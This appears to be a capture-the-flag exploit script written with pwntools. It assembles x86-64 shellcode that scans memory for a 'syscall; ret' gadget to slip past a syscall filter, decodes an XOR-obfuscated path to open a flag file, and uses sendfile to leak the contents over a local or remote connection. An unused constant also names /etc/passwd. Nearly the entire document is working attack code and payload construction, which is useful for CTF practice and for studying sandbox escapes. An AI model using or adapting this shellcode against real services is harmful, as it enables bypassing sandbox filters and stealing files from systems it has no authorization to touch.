import binascii
import sys

import pwn


TARGET = "/etc/passwd"

# rcx points to part of the text segment
# hunting for 0f 05 c3

HUNTER="""
    /* find a page start */
    mov rax, -1
    shl rax, 12
    and rcx, rax
    dec rcx
loopy:
    inc rcx
    mov al, [rcx]
    cmp al, 0x0f
    jne loopy
    mov al, [rcx+1]
    cmp al, 0x05
    jne loopy
    mov al, [rcx+2]
    cmp al, 0xc3
    jne loopy
    /* rcx should now be pointing to a syscall; ret pair */
    mov r12, rcx
    /*int3*/
"""

OPENER="""
    /* needs openat (257)
        /home/ctf/flag.txt: ['0x2f686f6d652f6374', '0x662f666c61672e74', '0x7874000000000000']
        encoded: ['0xafe8efede5afe3f4', '0xe6afe6ece1e7aef4', '0xf8f4808080808080']
    */
    mov rax, rsp
    sub rax, -32
    mov rdi, 0x8080808080808080
    mov rbx, 0xafe8efede5afe3f4
    xor rbx, rdi
    bswap rbx
    mov [rax], rbx
    mov rbx, 0xe6afe6ece1e7aef4
    xor rbx, rdi
    bswap rbx
    mov [rax+8], rbx
    mov rbx, 0xf8f4808080808080
    xor rbx, rdi
    bswap rbx
    mov [rax+16], rbx
    mov rdi, -100  /* AT_FDCWD */
    xor rdx, rdx   /* O_RDONLY */
    mov rsi, rax   /* string? */
    xor rax, rax
    mov ax, 257    /* SYS_openat */
    call r12       /* syscall replacement */
    /*int 3*/
    mov rsi, rax   /* save fd */
"""

# loop over fds 1-128
# rcx and r11 are not preserved
SENDER="""
    /* sendfile(out, rsi, offset, count); */
    /* sendfile(rdi, rsi, rdx, r10); , SYS_endfile = 40*/
    xor rax, rax
    push rax
    xor rdi, rdi
    xor r10, r10
    or r10w, 0xFFF
sender:
    mov rdx, rsp
    xor rax, rax
    or al, 40
    call r12
    /* TODO: if this succeeds, we can skip */
    inc rdi
    cmp dil, 128
    jbe sender
"""

def main(argv):
    pwn.context.arch = 'amd64'
    if len(argv) == 2:
        p = pwn.process(argv[1])
    elif len(argv) == 3:
        p = pwn.remote(argv[1], int(argv[2]))
    else:
        raise ValueError("need process or remote")
    sc = pwn.shellcraft.amd64.linux.exit(0)
    # dynamically fixup shellcode
    sc = HUNTER + OPENER + SENDER + sc
    sc = sc.replace('syscall', 'call r12')
    print('Shellcode after fixups:')
    print(sc)
    scraw = pwn.asm(sc)
    pad = b'\xcc' * (1024 - len(scraw))
    scraw += pad
    open('/tmp/sc3', 'wb').write(scraw)
    print(binascii.hexlify(scraw))
    p.recv()
    p.send(scraw)
    val = p.recvall()
    print(val)


if __name__ == '__main__':
    main(sys.argv)
